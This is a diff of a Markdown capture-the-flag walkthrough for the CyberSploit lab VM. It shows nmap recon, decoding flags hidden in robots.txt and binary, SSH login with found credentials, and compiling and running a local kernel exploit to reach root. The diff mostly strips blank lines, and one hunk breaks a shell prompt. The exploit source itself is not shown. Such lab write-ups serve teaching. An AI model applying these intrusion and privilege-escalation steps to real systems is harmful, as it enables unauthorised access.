@@ -62,8 +62,7 @@ After importing the `cybersploit.ova` file into your virtualization software, en
   
 
 ```bash
-
-┌──(root㉿neo)-[~]
+┌──root㉿neo)-[~]
 
 └─# arp-scan -l
 
@@ -78,7 +77,6 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 13 packets received by filter, 0 packets dropped by kernel
 
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.032 seconds (125.98 hosts/sec). 1 responded
-
 ```
 
   
@@ -92,7 +90,6 @@ Scan the identified IP address for open ports and services using Nmap:
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# nmap -A 192.168.1.6
@@ -150,7 +147,6 @@ HOP RTT ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 
 Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
-
 ```
 
   
@@ -164,7 +160,6 @@ Explore the web server running on port 80:
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# nmap -p80 192.168.1.6 --script=http-enum* -sV
@@ -194,7 +189,6 @@ MAC Address: 08:00:27:1F:EF:A6 (Oracle VirtualBox virtual NIC)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 
 Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
-
 ```
 
   
@@ -220,13 +214,11 @@ Now, proceed to investigate the contents of the `robots.txt` file to discover an
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# curl 192.168.1.6/robots.txt
 
 R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
-
 ```
 
   
@@ -236,7 +228,6 @@ Decode the base64-encoded content retrieved from `robots.txt` to reveal addition
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 --decode
@@ -244,7 +235,6 @@ Decode the base64-encoded content retrieved from `robots.txt` to reveal addition
 Good Work !
 
 Flag1: cybersploit{youtube.com/c/cybersploit}
-
 ```
 
   
@@ -254,7 +244,6 @@ Next, check the HTML source for potential usernames:
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# curl 192.168.1.6
@@ -358,7 +347,6 @@ Next, check the HTML source for potential usernames:
 </body>
 
 </html>
-
 ```
 
   
@@ -378,7 +366,6 @@ Use the discovered credentials to gain SSH access to the machine:
   
 
 ```bash
-
 ┌──(root㉿neo)-[~]
 
 └─# ssh itsskv@192.168.1.6
@@ -416,7 +403,6 @@ Your Hardware Enablement Stack (HWE) is supported until April 2017.
 Last login: Mon Apr 8 20:09:36 2024 from neo.bbrouter
 
 itsskv@cybersploit-CTF:~$
-
 ```
 
   
@@ -426,7 +412,6 @@ Flag 2 – User Home
   
 
 ```bash
-
 itsskv@cybersploit-CTF:~$ ls
 
 Desktop Documents Downloads examples.desktop flag2.txt Music Pictures Public Templates Videos
@@ -436,7 +421,6 @@ itsskv@cybersploit-CTF:~$ cat flag2.txt
 01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
 
 itsskv@cybersploit-CTF:~$
-
 ```
 
 We have found second flag as some compinations on 0101 it represents binary. Lets try to decrypt it by using online website. - **Cryptii:** Binary decoder tool. [Cryptii Binary Decoder](https://cryptii.com/pipes/binary-decoder)
@@ -457,11 +441,9 @@ To elevate privileges to the `root` user and locate the final flag, we first che
   
 
 ```bash
-
 itsskv@cybersploit-CTF:~$ uname -a
 
 Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
-
 ```
 
 - `uname -a`: Displays system information, including the kernel version.
@@ -482,9 +464,7 @@ We copied the exploit code and saved it in the `/tmp` directory as `exploit.c`.
   
 
 ```bash
-
 itsskv@cybersploit-CTF:/tmp$ nano exploit.c
-
 ```
 
   
@@ -498,11 +478,9 @@ After saving the exploit code, we compiled it using `gcc` and granted execution 
   
 
 ```bash
-
 itsskv@cybersploit-CTF:/tmp$ gcc exploit.c -o exploit
 
 itsskv@cybersploit-CTF:/tmp$ chmod +x exploit
-
 ```
 
 - `gcc exploit.c -o exploit`: Compiles the C source code (`exploit.c`) into an executable named `exploit`.
@@ -516,7 +494,6 @@ Executing the compiled exploit triggered the exploitation process, which involve
   
 
 ```bash
-
 itsskv@cybersploit-CTF:/tmp$ ./exploit
 
 spawning threads
@@ -532,7 +509,6 @@ child threads done
 creating shared library
 
 #
-
 ```
 
 - `./exploit`: Executes the compiled exploit, triggering the privilege escalation process.
@@ -544,7 +520,6 @@ With `root` access achieved, we navigated to the `/root` directory to locate and
   
 
 ```bash
-
 # cd /root
 
 # ls
@@ -588,7 +563,6 @@ if you like it share with me https://twitter.com/cybersploit1.
 Thanks !
 
 #
-
 ```
 
   
@@ -598,12 +572,9 @@ We successfully located the final flag (`flag3`) in the `/root` directory and ex
   
 
 ```
-
 flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
-
 ```
 
   
   
-
 By following these steps and understanding each command's purpose, you can gain valuable insights into the process of privilege escalation and exploit execution. Enjoy your exploration of cybersecurity!
